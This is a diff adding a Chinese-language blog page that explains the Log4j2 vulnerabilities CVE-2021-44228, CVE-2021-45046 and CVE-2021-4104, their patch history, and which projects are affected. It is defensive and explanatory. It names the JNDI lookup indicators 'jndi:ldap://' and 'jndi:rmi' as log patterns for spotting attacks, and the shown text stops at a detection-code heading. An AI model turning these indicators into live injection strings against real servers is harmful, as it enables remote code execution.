@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>log4j漏洞介绍及防护 | Hexo</title>
+  <meta name="description" content="1.概述   Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，被大量用于业务系统开发，用来记录日志信息。CVE-2021-44228 远程控制漏洞（RCE）影响从 2.0-beta9 到 2.14.1 的  Log4j  版本。受影响的    Log4j 版本包含 Java 命名和目录接口  (JNDI) 功能，可以执行如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="log4j漏洞介绍及防护">
+<meta property="og:url" content="https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/index.html">
+<meta property="og:site_name" content="wuhaocn">
+<meta property="og:description" content="1.概述   Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，被大量用于业务系统开发，用来记录日志信息。CVE-2021-44228 远程控制漏洞（RCE）影响从 2.0-beta9 到 2.14.1 的  Log4j  版本。受影响的    Log4j 版本包含 Java 命名和目录接口  (JNDI) 功能，可以执行如">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-17T07:59:58.675Z">
+<meta property="article:modified_time" content="2021-12-17T08:05:17.645Z">
+<meta property="article:author" content="wuhao">
+<meta property="article:tag" content="log4j">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="wuhaocn" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/wuhaocn" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.png" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">wuhaocn</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Java &amp; 后端 &amp; 通信</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> BeiJing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/wuhaocn" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/5G/">5G</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/algorithm/">algorithm</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/devops/">devops</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/network/">network</a><span class="category-list-count">20</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%9F%AD%E4%BF%A1/">短信</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80-shell/">编程语言 - shell</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/5G/" rel="tag">5G</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AOP/" rel="tag">AOP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DPDK/" rel="tag">DPDK</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JVM/" rel="tag">JVM</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MEC/" rel="tag">MEC</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NGAP/" rel="tag">NGAP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/akka/" rel="tag">akka</a><span class="tag-list-count">20</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/atomic/" rel="tag">atomic</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/brew/" rel="tag">brew</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmpp/" rel="tag">cmpp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/design/" rel="tag">design</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/grafana/" rel="tag">grafana</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jenkins/" rel="tag">jenkins</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/log4j/" rel="tag">log4j</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nexus/" rel="tag">nexus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/prometheus/" rel="tag">prometheus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sort/" rel="tag">sort</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/" rel="tag">动态调试技术</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%97%E8%8A%82%E7%A0%81/" rel="tag">字节码</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%88%87%E7%89%87/" rel="tag">网络切片</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/5G/" style="font-size: 13.33px;">5G</a> <a href="/tags/AOP/" style="font-size: 13px;">AOP</a> <a href="/tags/DPDK/" style="font-size: 13.17px;">DPDK</a> <a href="/tags/JVM/" style="font-size: 13.67px;">JVM</a> <a href="/tags/MEC/" style="font-size: 13px;">MEC</a> <a href="/tags/NGAP/" style="font-size: 13px;">NGAP</a> <a href="/tags/ai/" style="font-size: 13px;">ai</a> <a href="/tags/akka/" style="font-size: 14px;">akka</a> <a href="/tags/atomic/" style="font-size: 13.33px;">atomic</a> <a href="/tags/brew/" style="font-size: 13px;">brew</a> <a href="/tags/cmpp/" style="font-size: 13px;">cmpp</a> <a href="/tags/design/" style="font-size: 13px;">design</a> <a href="/tags/docker/" style="font-size: 13.5px;">docker</a> <a href="/tags/ftp/" style="font-size: 13px;">ftp</a> <a href="/tags/grafana/" style="font-size: 13px;">grafana</a> <a href="/tags/java/" style="font-size: 13px;">java</a> <a href="/tags/jenkins/" style="font-size: 13px;">jenkins</a> <a href="/tags/log4j/" style="font-size: 13px;">log4j</a> <a href="/tags/nexus/" style="font-size: 13px;">nexus</a> <a href="/tags/prometheus/" style="font-size: 13px;">prometheus</a> <a href="/tags/sort/" style="font-size: 13.83px;">sort</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/" style="font-size: 13px;">动态调试技术</a> <a href="/tags/%E5%AD%97%E8%8A%82%E7%A0%81/" style="font-size: 13.33px;">字节码</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%88%87%E7%89%87/" style="font-size: 13px;">网络切片</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">24</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/java/">java</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/" class="title">log4j漏洞介绍及防护</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-12-17T07:59:58.675Z" itemprop="datePublished">2021-12-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/network/">network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/12/03/network/akka/Akka-SLF4J%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/" class="title">Akka-SLF4J打印日志</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-12-03T09:08:28.304Z" itemprop="datePublished">2021-12-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/network/">network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/12/03/network/akka/Akka-Remote-%E9%85%8D%E7%BD%AE/" class="title">Akka-Remote-配置</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-12-03T08:24:00.895Z" itemprop="datePublished">2021-12-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/network/">network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/12/03/network/akka/Akka-%E6%8C%81%E4%B9%85%E5%8C%96-%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/" class="title">Akka-持久化-消息发送与接收</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-12-03T08:23:51.202Z" itemprop="datePublished">2021-12-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/network/">network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/12/03/network/akka/Akka-Actor-DeadLetter%E7%9B%91%E5%90%AC/" class="title">Akka-Actor-DeadLetter监听</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-12-03T08:22:48.138Z" itemprop="datePublished">2021-12-03</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<meta name="referrer" content="no-referrer" />
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-language/java/log4j/log4j漏洞介绍及防护" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      log4j漏洞介绍及防护
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/" class="article-date">
+	  <time datetime="2021-12-17T07:59:58.675Z" itemprop="datePublished">2021-12-17</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/java/">java</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/log4j/" rel="tag">log4j</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>   Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，被大量用于业务系统开发，用来记录日志信息。<br>CVE-2021-44228 远程控制漏洞（RCE）影响从 2.0-beta9 到 2.14.1 的  Log4j  版本。受影响的    Log4j 版本包含 Java 命名和目录接口  (JNDI) 功能，可以执行如消息查找替换等操作，攻击者可以通过向易受攻击的系统提交特制的请求，从而完全控制系统，远程执行任意代码，然后进行窃取信息、启动勒索软件或其他恶意活动。<br><strong>Apache Log4j2 安全补丁更新过程</strong></p>
+<ul>
+<li>2021 年 12 月 11 日：发布 <strong>2.15.0</strong> 版本，对** <strong>JNDI 查询功能进行限制。但</strong>此版本的修复不完整，导致了第二个 Log4j 漏洞： CVE-2021-45046**。</li>
+<li>2021-12-13<strong>：</strong> 发布 <strong>2.16.0</strong> 版本，为了解决 CVE-2021-45046 漏洞， Log4j 2.16.0 直接禁用了 JDNI 功能。<h3 id="1-1-官方说明"><a href="#1-1-官方说明" class="headerlink" title="1.1 官方说明"></a>1.1 官方说明</h3></li>
+</ul>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a><strong>（Log4j2 初始漏洞）</strong></p>
+<p>   Apache Log4j 2 2.0-beta9 到 2.12.1 和 2.13.0 到 2.15.0 版本的 JNDI 功能在配置、日志消息和参数中使用，无法防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。从版本 2.16.0 开始，此功能已完全删除。请注意，此漏洞特定于 log4j-core，不会影响 log4net、log4cxx 或其他 Apache 日志服务项目。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046">CVE-2021-45046</a><strong>（Log4j 2.15.0 未完整修复的漏洞）</strong></p>
+<p>   Apache Log4j 2.15.0 中针对 CVE-2021-44228 的修复在某些非默认配置中不完整。当日志配置使用非默认模式布局和上下文查找（例如，$${ctx:loginId}）或线程上下文映射模式（ %X、%mdc 或 %MDC）使用 JNDI 查找模式制作恶意输入数据，从而导致拒绝服务 (DOS) 攻击。默认情况下，Log4j 2.15.0 尽最大努力将 JNDI LDAP 查找限制为 localhost。Log4j 2.16.0 通过删除对消息查找模式的支持和默认禁用 JNDI 功能来修复此问题。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4104">CVE-2021-4104</a><strong>（Log4j 1.2 版本问题）</strong></p>
+<p>  当攻击者对 Log4j 配置具有写访问权限时，Log4j 1.2 中的 JMSAppender 容易受到不可信数据的反序列化。攻击者可以提供 TopicBindingName 和 TopicConnectionFactoryBindingName 配置，导致 JMSAppender 以类似于 CVE-2021-44228 的方式执行 JNDI 请求，从而导致远程代码执行。<br>注意， JMSAppender 不是 Log4j 的默认配置，因此此漏洞<strong>仅在特别配置为 JMSAppender 时才会影响 Log4j 1.2</strong>。事实上 Apache Log4j 1.2 已于 2015 年 8 月终止生命周期。用户应该升级到Log4j 2，因为它解决了以前版本的许多其他问题。<br>​</p>
+</li>
+</ul>
+<h3 id="1-2-开源组织"><a href="#1-2-开源组织" class="headerlink" title="1.2 开源组织"></a>1.2 开源组织</h3><ul>
+<li><strong>已修复/更新：</strong><ul>
+<li><strong>Metabase</strong> ：<a target="_blank" rel="noopener" href="https://www.oschina.net/news/173590/metabase-0-41-4-released">v0.41.4 发布，解决 log4j2 漏洞问题</a></li>
+<li><strong>openEuler</strong>：<a target="_blank" rel="noopener" href="https://my.oschina.net/openeuler/blog/5359350">欧拉开源社区 Log4j 高危安全漏洞修复完成</a></li>
+<li><strong>KubeSphere：</strong><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4197945/blog/5370085">Apache Log4j 2 远程代码执行最新漏洞的修复方案</a></li>
+<li>**MateCloud **：<a target="_blank" rel="noopener" href="https://www.oschina.net/news/173821">4.2.8 正式版发布，修复 Log4j2 的安全漏洞</a></li>
+<li>**openLooKeng **开源社区： <a target="_blank" rel="noopener" href="https://www.oschina.net/news/173802/openlookeng-log4j2-fix">Apache Log4j2 高危安全漏洞修复完成</a></li>
+<li><strong>JPress</strong> 博客系统：<a target="_blank" rel="noopener" href="https://www.oschina.net/news/172952/jpress-4-2-0-released">发布新版，修复 Log4j 漏洞问题</a></li>
+<li><strong>Netty</strong> ：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://tower.im/teams/779130/todos/11874/Netty%25204.1.72.Final%2520%25E5%258F%2591%25E5%25B8%2583%25EF%25BC%258C%25E6%259B%25B4%25E6%2596%25B0%2520Log4j2%2520%25E7%2589%2588%25E6%259C%25AC">4.1.72.Final 发布，更新 Log4j2 版本</a></li>
+<li><strong>Apache NiFi</strong> ：<a target="_blank" rel="noopener" href="https://www.oschina.net/news/173940/apache-nifi-1-5-1-released">1.5.1 紧急发布，修复 log4j2 相关问题</a></li>
+<li><strong>Jedis</strong> ：<a target="_blank" rel="noopener" href="https://www.oschina.net/news/173389/jedis-4-0-0-rc2-released">3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题</a></li>
+<li>**Eurynome Cloud **： <a target="_blank" rel="noopener" href="https://www.oschina.net/news/173440/eurynome-cloud-2-6-2-10-released">v2.6.2.10 发布，修复 Apache Log4j2 安全问题</a></li>
+<li><strong>Jedis</strong>： <a target="_blank" rel="noopener" href="https://www.oschina.net/news/173389/jedis-4-0-0-rc2-released">3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题</a></li>
+<li>**Apache Solr **：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://solr.apache.org/security.html%23apache-solr-affected-by-apache-log4j-cve-2021-44228">发布漏洞影响情况和缓解措施</a></li>
+<li><strong>Minecraft ：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition">发布漏洞声明和缓解方案</a></li>
+<li><strong>Apache Flink</strong> ：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://flink.apache.org/2021/12/10/log4j-cve.html">关于 Apache Log4j 零日 (CVE-2021-44228) 的建议</a></li>
+<li><strong>Apache Druid</strong>：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://lists.apache.org/thread/r5pf1vf0758cv4pszcz61pbk34kw02y4">建议所有用户升级到 Druid 0.22.1</a></li>
+<li><strong>OpenSearch：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://opensearch.org/blog/releases/2021/12/update-to-1-2-1/">重要提示：更新到 OpenSearch 1.2.1</a></li>
+<li><strong>OpenNMS：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/">受 Apache Log4j 漏洞影响的 OpenNMS 产品</a></li>
+<li><strong>IBM Cúram</strong> ：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://www.ibm.com/blogs/psirt/security-bulletin-vulnerability-in-apache-log4j-may-affect-cram-social-program-management-cve-2019-17571/">可能会影响 Cúram Social Program</a></li>
+<li><strong>IBM WebSphere：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://www.ibm.com/blogs/psirt/security-bulletin-vulnerability-in-apache-log4j-affects-websphere-application-server-cve-2021-44228/">受影响，已更新</a></li>
+</ul>
+</li>
+<li><strong>不受影响：</strong><ul>
+<li><strong>Anolis OS</strong>：<a target="_blank" rel="noopener" href="https://my.oschina.net/u/5265430/blog/5361164">不受 Log4j 高危安全漏洞影响</a></li>
+<li>**SUSE **：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://www.suse.com/c/suse-statement-on-log4j-log4shell-cve-2021-44228-vulnerability/">产品均不受影响</a></li>
+<li><strong>Apache Spark</strong>：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://issues.apache.org/jira/browse/SPARK-37630">不受影响</a></li>
+<li>**Curl / Libcurl **：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://twitter.com/bagder/status/1470879113116360706">不受影响</a></li>
+<li>**Zabbix **：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://blog.zabbix.com/zabbix-not-affected-by-the-log4j-exploit/17873/">不受影响</a></li>
+<li>**DBeaver **：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://dbeaver.io/2021/12/15/log4shell-vulnerability-is-not-dangerous-for-dbeaver-users/">Log4j2 漏洞对我们的用户不危险</a></li>
+<li><strong>VideoLAN：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://www.videolan.org/news.html%23news-2021-12-15">核心已移植到 Kotlin ，不用 Log4j</a></li>
+<li><strong>Cloudflare：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://blog.cloudflare.com/zh-cn/how-cloudflare-security-responded-to-log4j2-vulnerability-zh-cn/">Cloudflare 如何安全应对 Log4j 2 漏洞</a></li>
+<li><strong>LastPass：</strong><a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://support.logmeininc.com/lastpass/help/log4j-vulnerability-faq-for-lastpass-universal-proxy">不受影响</a></li>
+<li><strong>HackerOne</strong>：<a target="_blank" rel="noopener" href="https://www.oschina.net/action/GoToLink?url=https://twitter.com/jobertabma/status/1469490881854013444">不受影响，能利用漏洞影响 H1 的人可获得 25000 美金奖励</a></li>
+</ul>
+</li>
+<li>​<strong>发布漏洞相关工具</strong><ul>
+<li><strong>360CERT</strong>：<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4600927/blog/5371617">发布Log4j2恶意荷载批量检测调查工具</a></li>
+<li><strong>腾讯容器安全</strong>：<a target="_blank" rel="noopener" href="https://www.oschina.net/news/173667">发布开源 Log4j2 漏洞缓解工具</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-初始漏洞说明"><a href="#2-初始漏洞说明" class="headerlink" title="2.初始漏洞说明"></a>2.初始漏洞说明</h2><ul>
+<li> 影响范围<br>Apache Log4j 2.x &lt;= 2.15.0-rc1<br>受影响的应用及组件（包括但不限于）如下： Apache Solr、Apache Flink、Apache Druid、Apache Struts2、srping-boot-strater-log4j2等。 </li>
+<li> 攻击检测<br>可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。<br>检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。 </li>
+</ul>
+<h2 id="3-检测代码"><a href="#3-检测代码" class="headerlink" title="3.检测代码"></a>3.检测代码</h2><ul>
